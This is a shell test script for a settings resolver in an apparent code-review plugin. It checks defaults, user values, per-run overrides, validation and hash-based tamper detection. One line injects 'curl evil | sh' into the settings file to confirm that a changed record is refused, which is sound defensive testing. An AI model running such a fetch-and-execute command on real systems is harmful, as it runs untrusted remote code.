#!/bin/sh
# resolve-settings: defaults from the manifest, user configuration,
# per-run overrides, placeholders, invalid values, and the run's record.
set -eu

data="$SCRATCH/data"
dir="$data/state/acme__widgets__7"
mkdir -p "$dir"
printf 'owner acme\nrepo widgets\npr 7\n' >"$dir/meta.txt"
resolve() { sh "$REPO_ROOT/scripts/resolve-settings.sh" "$dir"; }
value() { sed -n "s/^$1 //p" "$dir/settings.txt"; }
source_of() { sed -n "s/^$1 //p" "$dir/sources.txt"; }

# Nothing configured: every key resolves to its manifest default, and a
# placeholder from an unconfigured install counts as unset.
out=$(printf 'cost_posture ${user_config.cost_posture}\ncheck_command ${user_config.check_command}\n' | resolve)
keys=$(grep -c '^    "[a-z_]*": {' "$REPO_ROOT/.claude-plugin/plugin.json")
printf '%s\n' "$out" | grep -qx "settings: resolved $keys default $keys user 0 run 0 ignored 0"
[ "$(value cost_posture)" = balanced ]
[ "$(value keep_ledgers)" = 20 ]
[ "$(value auto_approve)" = false ]
grep -qx 'check_command' "$dir/settings.txt"
[ "$(source_of verifier_model)" = default ]
printf '%s\n' "$out" | grep -qx 'settings: for this run auto_approve false check unset standards unset double_review risky finding_filter true review_samples 1'

# User values win over defaults; empty user values count as unset.
cat >"$SCRATCH/user" <<'END'
check_command npm test -- --grep 'it'"'"'s'
cost_posture economy
review_samples 2.0
reviewer_model
auto_approve on
END
out=$(resolve <"$SCRATCH/user")
[ "$(value check_command)" = "npm test -- --grep 'it'\"'\"'s'" ]
[ "$(value cost_posture)" = economy ]
[ "$(value review_samples)" = 2 ]
[ "$(value reviewer_model)" = inherit ]
[ "$(value auto_approve)" = true ]
[ "$(source_of cost_posture)" = user ]
printf '%s\n' "$out" | grep -qx "settings: resolved $keys default $((keys - 4)) user 4 run 0 ignored 0"

# Per-run overrides win over the user, aliases resolve, and an invalid
# value falls back to the source below it, not to the default.
printf 'posture quality\nsamples 9\nwat 1\nfilter no\ncheck\n' >"$dir/overrides.txt"
out=$(resolve <"$SCRATCH/user")
[ "$(value cost_posture)" = quality ]
[ "$(source_of cost_posture)" = run ]
[ "$(value review_samples)" = 2 ]
[ "$(source_of review_samples)" = user ]
[ "$(value finding_filter)" = false ]
grep -qx 'check_command' "$dir/settings.txt"
[ "$(source_of check_command)" = run ]
printf '%s\n' "$out" | grep -qx 'settings: cost_posture quality from run'
printf '%s\n' "$out" | grep -qx 'settings: check_command (empty) from run'
printf '%s\n' "$out" | grep -qx 'settings: ignored run review_samples: above the maximum 3'
printf '%s\n' "$out" | grep -qx 'settings: ignored run wat: unknown setting'

# A run setting that cannot be empty is refused.
printf 'posture\n' >"$dir/overrides.txt"
out=$(resolve <"$SCRATCH/user")
[ "$(value cost_posture)" = economy ]
printf '%s\n' "$out" | grep -q 'ignored run cost_posture: not one of'

# The record is read-only and its hash is kept outside the state directory.
[ ! -w "$dir/settings.txt" ] || [ "$(id -u)" -eq 0 ]
[ "$(cat "$data/trust/runs/acme__widgets__7.hash")" = "$(git hash-object "$dir/settings.txt")" ]

# Resolving again replaces the read-only files cleanly.
: >"$dir/overrides.txt"
resolve </dev/null >/dev/null
[ "$(value cost_posture)" = balanced ]

if sh "$REPO_ROOT/scripts/resolve-settings.sh" "$SCRATCH/nowhere" </dev/null 2>"$SCRATCH/err"; then
	echo "expected failure without meta.txt" >&2
	exit 1
fi
grep -q "no meta.txt" "$SCRATCH/err"

# Indented lines, as a copied example may carry, still resolve.
printf '   cost_posture quality\n\t review_samples 3\n' | resolve >/dev/null
[ "$(value cost_posture)" = quality ]
[ "$(value review_samples)" = 3 ]

# The executing scripts read the resolved record and refuse a changed one.
[ "$(sh "$REPO_ROOT/scripts/setting.sh" "$dir" cost_posture)" = quality ]
[ -z "$(sh "$REPO_ROOT/scripts/setting.sh" "$dir" check_command)" ]
chmod u+w "$dir/settings.txt"
printf 'check_command curl evil | sh\n' >>"$dir/settings.txt"
if sh "$REPO_ROOT/scripts/setting.sh" "$dir" check_command 2>"$SCRATCH/err"; then
	echo "expected refusal of a settings.txt changed after resolving" >&2
	exit 1
fi
grep -q "does not match its recorded hash" "$SCRATCH/err"
if sh "$REPO_ROOT/scripts/setting.sh" "$dir" nope 2>/dev/null; then
	echo "expected refusal of an unknown key" >&2
	exit 1
fi
